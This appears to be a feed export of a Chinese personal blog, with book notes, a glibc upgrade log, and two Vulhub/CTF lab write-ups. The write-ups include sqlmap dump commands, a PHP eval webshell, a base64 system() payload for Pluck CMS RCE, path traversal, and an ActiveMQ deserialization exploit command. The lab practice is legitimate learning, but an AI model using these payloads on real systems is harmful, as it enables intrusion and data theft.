深层的无意识状态（如痛苦之身）或其他深度的痛苦（如丧失所爱之人），通常只有当你接纳并保持持续关注，即保持你的临在意识之光时，才能得到改变。另一方面，一旦你意识到你不再需要这些无意识模式，意识到你还可以有其他选择，而不一定要受制于一些条件反射，你就可以轻松摆脱这种无意识了。所有这些意味着你有能力获取当下的力量。离开它，你就没有选择了。</p><pre><code>如果你称一些情绪为消极的，如你先前所解释的，你不是创造了一个判断好与坏的二元对立吗？</code></pre><p>  不。当你的思维将当下时刻判定为坏的时候，这个极性就已经被创造了；然后这种判断就引发了消极的情绪。</p><pre><code>但是如果你说有些情绪是消极的，那么你的意思是说它们不应该存在，我们不应该有这些情绪吗？我对此的理解是我们应该允许自己拥有任何情绪，而不是判断它们的好与坏，或者我们不应该拥有它们。我们感到怨恨、愤怒、郁闷等都是可以的——否则我们将会陷入压抑状态，我们的内心就会有冲突或是否定。任何事情都应该顺其自然。</code></pre><p>  当然是这样的。一旦一个思维模式、一个情绪或者反应存在时，我们就应该接受它。你那时没有足够的意识来做出选择。这不是一个判断，只是一个事实。如果你只有一个选择，或者认识到你的确可以有一个选择，你会选择痛苦还是欢乐，安逸还是不安，和平还是冲突？你会选择一种使你脱离自然的幸福状态、脱离生命内在欢乐的思想或情绪吗？任何这样的情绪，我们都称之为消极的情绪，简单地说就是不好的情绪。这并不是说“你不该这么做”的那种不好，而只是客观评述，就像说胃痛一样。</p><p>  仅在20世纪就有一亿多的人死于其他同胞之手，这怎么可能呢？人类彼此造成的这种痛苦是超乎你的想象的。这还不包括每天人类彼此间或对其他生物造成的精神、情绪、身体上的暴力、折磨等痛苦。</p><p>  他们以这种方式行动是因为他们进入了自己的自然状态，并感受到了生命内在的喜悦吗？当然没有。只有那些处于深深的消极状态之中、感觉很坏的人才会做出这种事情，这反映了他们内在的状态。现在他们又在开始破坏大自然以及他们赖以生存的地球。这简直令人无法相信，但这却又是一个事实。人类是一个精神失常并且非常病态的物种。这不是批判，而是事实。还有这样的一个事实：人类在疯狂之下是有理智的，而现在你就可以找到一些治疗和拯救方法。</p><p>  现在回到你刚才所说的——当你接受了你的怨恨、压抑和愤怒时，你不再被迫盲目地将它们付诸行动，而你也不太会将它们投射在其他人身上。这的确是真的，但是我不知道你是不是在欺骗你自己。因为当你练习接纳一段时间之后，你需要再继续向下一个阶段迈进，那个不再创造这些消极情绪的阶段。如果你不再继续向前迈进，你的这种接纳就成了一个精神上的标记，它使你的小我不断地沉浸在不幸之中，而且还会加强你和其他人的分离感。如你所知，分离是小我认同感的基础。真正的接纳会立即转化这些情感。如果你真的认为每件事都很好，这当然是真的，但是你在一开始就会有这些消极的情感吗？不批判和抗拒的话，这些消极的情感就不会产生。在你的大脑中，你有了想法，认为每件事都很好，但是，在你的内心深处你又不能真正地相信它，所以那种陈旧的、抗拒的思维——情绪模式仍然存在。这就是让你感觉不好的原因。</p><pre><code>那也没什么不好。</code></pre><p>  你在维护你无意识和遭受痛苦的权利吗？别着急：没有人会把它们从你的身边夺走。一旦你认识到某种食物让你恶心，你还会继续吃这种食物，并还声称恶心的感觉很好吗？</p><h2 id="第五章-临在状态"><a href="#第五章-临在状态" class="headerlink" title="第五章 临在状态"></a>第五章 临在状态</h2><h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>​实在是…过于震撼的一本好书 很好的教会了我如何去正视并消除自己的杂乱思想 虽然难以真正达到书中描写的“开悟”  但的确有了不少隐约的自信与安稳<br>​遭受苦难并不少见 将其快速瓦解 化为一种行事的能量 然后采取行动</p><p>​</p><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h1><blockquote><p>We are just another visitor in a transient world.</p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;“活在当下”&quot;&gt;&lt;a href=&quot;#“活在当下”&quot; class=&quot;headerlink&quot; title=&quot;“活在当下”&quot;&gt;&lt;/a&gt;“活在当下”&lt;/h1&gt;&lt;p&gt;本书 面向开悟 脱离思想与痛苦 将当下作为一切 &lt;/p&gt;</summary>
    
    
    
    <category term="读书笔记" scheme="https://www.maonie.top/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="读书笔记" scheme="https://www.maonie.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>网页小修时间</title>
    <link href="https://www.maonie.top/2024/11/23/%E7%BD%91%E9%A1%B5%E5%B0%8F%E4%BF%AE%E6%97%B6%E9%97%B4/"/>
    <id>https://www.maonie.top/2024/11/23/%E7%BD%91%E9%A1%B5%E5%B0%8F%E4%BF%AE%E6%97%B6%E9%97%B4/</id>
    <published>2024-11-23T03:46:50.000Z</published>
    <updated>2024-11-23T04:45:16.963Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="这篇文章单纯是为了推进-督促我搞这个博客的进度的"><a href="#这篇文章单纯是为了推进-督促我搞这个博客的进度的" class="headerlink" title="这篇文章单纯是为了推进/督促我搞这个博客的进度的"></a>这篇文章单纯是为了推进/督促我搞这个博客的进度的</h2><p>已经干的</p><ul><li>404自定义页面</li></ul><p>要干的</p><ul><li>新页面的功能构思/页面设计</li><li>jsplayer/或者别的什么 播放音乐</li><li>搜索引擎支持/rss逻辑更新</li><li>自我介绍update</li><li>不必多说的写更多文章</li></ul><p>反正有空了都能来搞 先推上日程</p></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="前端" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="前端" scheme="https://www.maonie.top/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>glibc更新记录</title>
    <link href="https://www.maonie.top/2024/11/12/glibc%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.maonie.top/2024/11/12/glibc%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95/</id>
    <published>2024-11-12T12:06:22.000Z</published>
    <updated>2024-11-12T22:29:03.573Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>最近因为各种各样的原因操弄上了校园官方渠道的服务器 分到了配置linux系统的工作<br>为了完成我的任务 我需要安装更新版本的glibc<br>期间发生了大大小小的问题还把服务器搞炸了 总之记录一下防止后边踩坑吧<br>以后再有linux系统选择相关的 铁定首选ubuntu 我心累了</p><span id="more"></span><h2 id="万恶之源"><a href="#万恶之源" class="headerlink" title="万恶之源"></a>万恶之源</h2><p>服务器系统的选择上来说——环境是一个基本光秃秃啥都没装的CentOS Linux release 7.9.2009 (Core)<br>yum确实可以事先安装大部分玩意 但 GLIBC 库是系统的基础组件 我无法于当前的系统版本直接通过yum更新glibc<br>既然apt(Ubuntu才有的安装方式) yum rpm都不行 就只能尝试最拖最难搞的源码安装了</p><h2 id="好比套娃的安装方式"><a href="#好比套娃的安装方式" class="headerlink" title="好比套娃的安装方式"></a>好比套娃的安装方式</h2><p>在网上找了一会 看到了个相对来说靠谱 版本对劲的安装指南<br>依据<a href="https://blog.csdn.net/carefree2005/article/details/117559312">该教程</a>的说法</p><h3 id="至于安装glibc的2-31版本有以下的要求-麻烦"><a href="#至于安装glibc的2-31版本有以下的要求-麻烦" class="headerlink" title="至于安装glibc的2.31版本有以下的要求&amp;麻烦"></a>至于安装glibc的2.31版本有以下的要求&amp;麻烦</h3><ol><li>安装glibc时中断/配置不全或者因为各种各样的原因都极易导致服务器崩溃</li><li>glibc所需要的组件多且版本要求高 基本也同样是没法用yum一站式解决的 需要源码安装</li><li>具体需求（可能不对 可以去实际操作的时候查看目录下的install文件）<br>  需要python版本2.7.6以上 3.4以上（python2 3同时需要）<br>  gcc版本4.7以上<br>  make版本3.79以上<br>  bison（有个叫m4的依赖）版本2.7以上</li><li>源码安装运行./configure时 务必谨慎配置–prefix项（决定安装目录） 并且搞懂每个版本的相同软件在系统中的位置</li><li>yum依靠python运行 若更新python时覆盖了原版本 会十分麻烦 重装相同版本也难以恢复 需要通过卸载所有python 以rpm覆盖的方式恢复yum的使用 还有yum的指定python运行路径由文件 /usr/libexec/urlgrabber-ext-down 与 /usr/bin/yum 决定<br>  <img data-src="/2024/11/12/glibc%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95/1.jpg" alt="1"><br>  如果yum出现了各种各样的问题 记得先检查这两个文件的第一行</li><li>源码安装时有些软件会强制你在文件夹下新建build文件夹再执行configure 这里建议先手创建好文件夹再../configure 先下手为强</li><li>源码安装gcc非常非常慢 建议做好等待半小时-一小时（基于你make时候指定的-j参数 后面会说）的准备</li><li>更新glibc似乎会导致不少命令暂时失效  如果你是通过ssh等命令连接的服务器 务必不要退出 不然会导致服务器爆炸可以<a href="https://blog.csdn.net/qq_35345103/article/details/99679506">参考这玩意里的代码</a>试图恢复</li><li>如果还是一不小心给yum python整炸了 <a href="https://www.cnblogs.com/gcgc/p/15922141.html">参考教程</a>可以做到恢复功能 记得注意版本区别</li></ol><h2 id="具体的安装过程"><a href="#具体的安装过程" class="headerlink" title="具体的安装过程"></a>具体的安装过程</h2><p>因为早就过去了所以复现图片啥的就不贴咯<br>先用yum安装一些没必要源码安装的东西<br>yum update -y<br>yum install bison make wget unzip等等</p><p>至于又臭又长的源码安装全过程</p><ol><li>用wget下载软件的源tar包</li><li>解压后阅读install文件/去网络搜索所需依赖</li><li>创建build文件夹后在其中运行configure文件 成功的话会提示创建了makefile 报错了就要去检查哪里有问题</li><li>make后输入make install安装似乎就完成了 记得检查安装目录是否安装成功</li></ol><p>gcc python2 3 glibc都需要用如上的方式来安装 期间会遇到各种各样的问题 因为每个软件的源码安装会有不同的需求</p><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h2><hr><div style="text-align: center;">奠  某个服务器的第一条命（虽然挺快就重置了） 奠<br>死因:glibc没配置好导致错误的软连接 输入什么都回显Segmentation fault 变相的系统崩溃</div><blockquote><p>We are just another visitor in a transient world.</p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;最近因为各种各样的原因操弄上了校园官方渠道的服务器 分到了配置linux系统的工作&lt;br&gt;为了完成我的任务 我需要安装更新版本的glibc&lt;br&gt;期间发生了大大小小的问题还把服务器搞炸了 总之记录一下防止后边踩坑吧&lt;br&gt;以后再有linux系统选择相关的 铁定首选ubuntu 我心累了&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/linux/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="https://www.maonie.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Vulhub在线靶场记录</title>
    <link href="https://www.maonie.top/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.maonie.top/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/</id>
    <published>2024-10-25T13:43:31.000Z</published>
    <updated>2024-11-08T14:56:57.985Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="开幕介绍-具体简介"><a href="#开幕介绍-具体简介" class="headerlink" title="开幕介绍&amp;具体简介"></a>开幕介绍&amp;具体简介</h1><p>具体环境为<a href="https://yunjing.ichunqiu.com/">这个网站</a><br>能在线部署不少漏洞环境 很方便 正巧拿去了解一下vulhub与src</p><p>不会把打过的全部记录 主要是因为有的靶场重复度略高 分分钟就刷完了 <del>说到底还是条懒狗</del><br>tips:靶场环境很怪 有的时候不开代理加载不全</p><span id="more"></span><h1 id="常见套路"><a href="#常见套路" class="headerlink" title="常见套路"></a>常见套路</h1><p>密码账号通常藏在网页信息中/单纯就是初始密码<br>使用将burp中的raw报文保存为txt后 <code>mysql -r 文件名 -batch --dbs</code>进行暴库的方式进行sql注入<br><strong>↑多见于post传参时使用</strong><br>只要文件类型允许php便能通过链接后端webshell的方式进行文件上传漏洞验证</p><h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a><strong>CVE-2022-32991</strong></h2><blockquote><p><em>靶标介绍：</em></p><p>该CMS的welcome.php中存在SQL注入攻击。</p></blockquote><p>靶标写的很清楚了 就是sql注入攻击<br>随意注册一个账号 登陆后便看到了我们的目标——welcome.php<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/1.jpg" alt="1"><br>拖到sqlmap里说是参数q并不能注入 点击start跳转目录 能看到更多的传参<br>再次放到sqlmap里处理….. 显示eid可注入 挺好的</p><pre class="line-numbers language-none"><code class="language-none">-u "想注入的网址" //目标地址--dbs //爆出所有数据库-D //选中数据库 配合 --tables //爆出所有数据库下的项-T //选中项 配合 --dump //爆出项中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>配合网址就能爆出数据库ctf中flag项里的具体数据——flag值 过关</p><h2 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a><strong>CVE-2022-30887</strong></h2><blockquote><p><em>靶标介绍：</em></p><p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action/editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。</p></blockquote><p>一进主页面是全白的<br>铁定不对 先用dirb扫了一遍<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/2.jpg" alt="2"><br>发现个login目录 进去跳转到了wordpress的登陆页面<br>至于登陆的账号密码已经在标题上写好了——test<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/3.jpg" alt="3"><br>登陆进去看看<br>在wp-admin处 我们利用<a href="https://wpscan.com/vulnerability/a0e40cfd-b217-481c-8fc4-027a0a023312/">一个漏洞</a>来获取mysql 数据库中的数据</p><pre class="line-numbers language-none"><code class="language-none">http://eci-2ze816q8joahfm3hcxoi.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=rest-nonce //获取一段随机数http://eci-2ze6ki5jtumuv5ixl9hu.cloudeci1.ichunqiu.com/wp-json/wp-statistics/v2/metabox?_wpnonce=[刚刚获取的随机数]&amp;name=words&amp;search_engine=aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将输入后的内容用burpsuite抓包<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/4.jpg" alt="4"><br>然后将报文保存在一个1.txt中 然后利用sqlmap进行暴库</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -r 1.txt --batch --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/5.jpg" alt="5"></p><p>然后就很自然的爆出了flag 耶</p><h2 id="CVE-2022-28525"><a href="#CVE-2022-28525" class="headerlink" title="CVE-2022-28525"></a>CVE-2022-28525</h2><blockquote><p><em>靶标介绍：</em></p><p>ED01-CMS v20180505 存在任意文件上传漏洞</p></blockquote><p>进入页面 发现需要登陆 且无法正常注册用户</p><p><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/6.jpg" alt="6"></p><p>那就f12看看线索吧…<br>发现似乎存在admin账号 那就先admin/admin试试 再不行抓包爆破了</p><p><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/7.jpg" alt="7"></p><p>然后顺利进去了 傻眼<br>管理员页面全是文章添加/删改相关的 能上传东西的只有一个账号头像了<br>上传后门文件1.php 内容还是老样子</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST['123']); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/8.jpg" alt="8"></p><p>右键图片处copy文件网址 放进蚁剑里链接 在/flag处获得flag 完成！</p><p><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/9.jpg" alt="9"></p><h2 id="CVE-2023-7105"><a href="#CVE-2023-7105" class="headerlink" title="CVE-2023-7105"></a>CVE-2023-7105</h2><blockquote><p><em>靶标介绍：</em></p><p>E-Commerce Website 1.0 允许通过“index_search.php”中的参数“search”进行 SQL 注入。利用这个问题可能会使攻击者有机会破坏应用程序，访问或修改数据，或者利用底层数据库中的最新漏洞。</p></blockquote><p>进入主页 翻到个搜索框 看来就是对应了靶标中的<code>index_search</code>功能<br>burp开着监听 随便搜点东西 监听到了搞成txt放进sqlmap<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/10.jpg" alt="10"></p><pre class="line-numbers language-none"><code class="language-none">sqlmap -r [报文txt] --dbs //爆出数据库sqlmap -r [报文txt] -D [数据库名] --tables //选中数据库爆出数据项sqlmap -r [报文txt] -D [数据库名] -T [数据项名] --dump //爆出数据项中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img data-src="/11.jpg" alt="11"></p><p>弄到最后一步就有flag了</p><h2 id="CVE-2022-26965"><a href="#CVE-2022-26965" class="headerlink" title="CVE-2022-26965"></a>CVE-2022-26965</h2><blockquote><p><em>靶标介绍：</em></p><p>Pluck-CMS-Pluck-4.7.16 后台RCE</p></blockquote><p>进入页面啥也没有 点击脚注admin<br>输入密码admin进入后台<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/12.jpg" alt="12"></p><p>rce的具体地点发生在网站后台的<strong>更换主题</strong>中<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/13.jpg" alt="13"></p><p>去github上搜索关键词 <code>Pluck CMS</code> 去寻找简介里有 <strong>theme</strong> 字眼的项目<br><img data-src="/2024/10/25/Vulhub%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/14.jpg" alt="14"></p><p>进去之后在release页面下载 解压内容之后更改<code>info.php</code>文件内的具体代码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpfile_put_contents('testshell.php',base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg=='));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改完再次打包成zip 安装主题里弄上<br>安装完之后访问环境<code>/testshell.php?1= cat /flag</code>获取flag<br>完成！</p><h2 id="CVE-2023-37474"><a href="#CVE-2023-37474" class="headerlink" title="CVE-2023-37474"></a>CVE-2023-37474</h2><blockquote><p><em>靶标介绍：</em></p><p>Copyparty是一个可移植的文件服务器。在1.8.2版本之前的版本存在一个CTF技巧，该漏洞位于<code>.cpr</code>子文件夹中。路径遍历攻击技术允许攻击者访问位于Web文档根目录之外的文件、目录.</p></blockquote><p>子目录也说了是.cpr 在网址后边输入/.cpr/（想要获取的文件名）<br>/符号用%2f代替即可 输入后便会自动下载相应的文件</p><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h1><blockquote><p>We are just another visitor in a transient world.</p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;开幕介绍-具体简介&quot;&gt;&lt;a href=&quot;#开幕介绍-具体简介&quot; class=&quot;headerlink&quot; title=&quot;开幕介绍&amp;amp;具体简介&quot;&gt;&lt;/a&gt;开幕介绍&amp;amp;具体简介&lt;/h1&gt;&lt;p&gt;具体环境为&lt;a href=&quot;https://yunjing.ichunqiu.com/&quot;&gt;这个网站&lt;/a&gt;&lt;br&gt;能在线部署不少漏洞环境 很方便 正巧拿去了解一下vulhub与src&lt;/p&gt;
&lt;p&gt;不会把打过的全部记录 主要是因为有的靶场重复度略高 分分钟就刷完了 &lt;del&gt;说到底还是条懒狗&lt;/del&gt;&lt;br&gt;tips:靶场环境很怪 有的时候不开代理加载不全&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="src" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/src/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="src" scheme="https://www.maonie.top/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>Vulhub记录（旧的）</title>
    <link href="https://www.maonie.top/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.maonie.top/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/</id>
    <published>2024-09-30T02:29:55.000Z</published>
    <updated>2024-10-25T13:40:14.649Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="一脚踹开src的大门"><a href="#一脚踹开src的大门" class="headerlink" title="一脚踹开src的大门"></a>一脚踹开src的大门</h2><p>嘛 机缘巧合下开始练习src 总之先拿vulhub练练手<br>注释: 本来用的是docker纯本地搭建 效率太鸡肋了 换成在线网站搞flag的形式吧 没法getshell的会在这里继续更新</p><span id="more"></span><p>漏洞很多 试点经典的 基本按着readme做</p><h1 id="总结遇到的问题"><a href="#总结遇到的问题" class="headerlink" title="总结遇到的问题"></a>总结遇到的问题</h1><p>-我使用的环境是 <strong>docker for windows</strong> 因此会出现各种奇葩的问题 这里记录</p><h2 id="换行符问题"><a href="#换行符问题" class="headerlink" title="换行符问题"></a>换行符问题</h2><p>关键词:(出现在常常闪退的容器环境的log中)</p><pre class="line-numbers language-none"><code class="language-none">$'\r': command not foundsyntax error: unexpected end of fileexec /docker-entrypoint.sh: no such file or directory （CVE-2019-14234）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>vulhub下自带文件有些只考虑了linux的换行符/文件格式 下载到windows会被自动转换<br>我使用了Git Bash 自带的工具 <code>dos2unix</code>转换文件至unix格式 至此就能正常运行了</p><h1 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h1><p>至于创建环境和搭建环境 请自行练习docker的操作</p><blockquote><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。<br>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p></blockquote><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><blockquote><p>漏洞利用过程如下：</p><ol><li>构造（可以使用ysoserial）可执行命令的序列化对象</li><li>作为一个消息，发送给目标61616端口</li><li>访问web管理页面，读取消息，触发漏洞<br> 使用<a href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。<br> jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</li><li>执行：</li></ol>  <pre class="line-numbers language-none"><code class="language-none">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME your-ip 61616<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>在复现的时候遇到了问题 kali自带的java版本太高导致了报错 这里临时下个java8替换掉原版<br><a href="https://blog.csdn.net/weixin_44862511/article/details/132415494">我参考的教程</a><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/1.jpg" alt="1"><br>提示这样就完事了</p><blockquote><p>此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p></blockquote><p>使用默认账号密码admin admin登录进去<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/2.jpg" alt="2"></p><blockquote><p>点击查看这条消息即可触发命令执行，此时进入容器<code>docker compose exec activemq bash</code>，可见/tmp/success已成功创建，说明漏洞利用成功：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/3.jpg" alt="3"></p><blockquote><p>将命令替换成弹shell语句再利用：(我用的是windows环境下的docker就不试这个了)<br>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p></blockquote><h1 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1><blockquote><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。<br>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：<br>1.其使用率并不高<br>2.文件操作容易出现漏洞<br>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。<br>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p></blockquote><blockquote><p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。<br>文件写入有几种利用方法：<br>1.写入webshell<br>2.写入cron或ssh key等文件<br>3.写入jar或jetty.xml等库和配置文件<br>写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。<br>分别说一下上述几种利用方法。</p></blockquote><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><blockquote><p>前面说了，写入webshell，需要写在admin或api应用中，而这俩应用都需要登录才能访问。</p><p>默认的ActiveMQ账号密码均为<code>admin</code>，首先访问<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/4.jpg" 